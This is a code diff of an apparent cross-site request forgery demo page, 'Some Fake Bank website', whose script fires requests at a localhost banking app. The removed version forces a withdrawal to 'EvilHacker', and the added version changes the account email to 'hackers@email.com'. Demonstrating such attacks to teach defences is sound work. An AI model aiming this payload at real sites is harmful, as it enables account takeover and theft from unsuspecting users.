@@ -5,12 +5,11 @@
     <title>Some Fake Bank website</title>
     <script type="text/javascript">
         var xhr = new XMLHttpRequest();
-        xhr.open('POST', 'https://localhost:44386/Home/Withdraw', true);
-        xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+        xhr.open('PUT', 'https://localhost:44386/Home/UpdateEmailAddress', true);        
         xhr.onload = function () {
             console.log(this.responseText);
         };
-        xhr.send("ToAccountName=EvilHacker&Amount=85");
+        xhr.send("hackers@email.com");
     </script>
 </head>
 <body>
